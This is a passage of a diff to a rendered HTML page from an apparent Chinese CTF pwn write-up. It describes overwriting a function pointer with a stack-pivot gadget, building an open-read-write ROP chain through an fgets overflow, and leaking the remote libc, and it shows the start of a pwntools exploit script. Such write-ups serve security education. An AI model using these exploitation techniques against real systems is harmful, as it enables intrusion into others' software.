 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">ret</span>
@@ -2302,10 +2520,20 @@ $$Y_{n+1} = [(aX_n + b) \mod p] \mod 256$$
 </span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">000000000000131</span><span class="n">B</span>                 <span class="n">mov</span>     <span class="n">rdi</span><span class="p">,</span> <span class="n">rbp</span>        <span class="p">;</span> <span class="n">s</span>
 </span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span><span class="p">:</span><span class="mi">000000000000131</span><span class="n">E</span>                 <span class="n">call</span>    <span class="n">_fgets</span>
 </span></span></code></pre></div><p>然后我们把 p_sub_16E0 覆盖成这个gadget <code>push rdi ; pop rsp ; ret</code>。因为执行 p_sub_16E0 之前寄存器的状态是这样的</p>
-<p><img src="/img/2025-QWNT/54.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/54.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>用这个gadget就能把栈迁移到bss段上，最后通过fgets的溢出来布置orw的rop链即可</p>
 <p>大概泄露了一下远程的libc</p>
-<p><img src="/img/2025-QWNT/55.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/55.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
@@ -2499,7 +2727,7 @@ $$Y_{n+1} = [(aX_n + b) \mod p] \mod 256$$
           <ul class="pager blog-pager">
             
               <li class="previous">
-                <a href="/post/qwb-s9-su-wu/" data-toggle="tooltip" data-placement="top" title="2025 QWB-S9 SU WriteUp">&larr; Previous Post</a>
+                <a href="/post/wmctf-2025-su-wu/" data-toggle="tooltip" data-placement="top" title="2025 WMCTF SU WriteUp">&larr; Previous Post</a>
               </li>
             
             
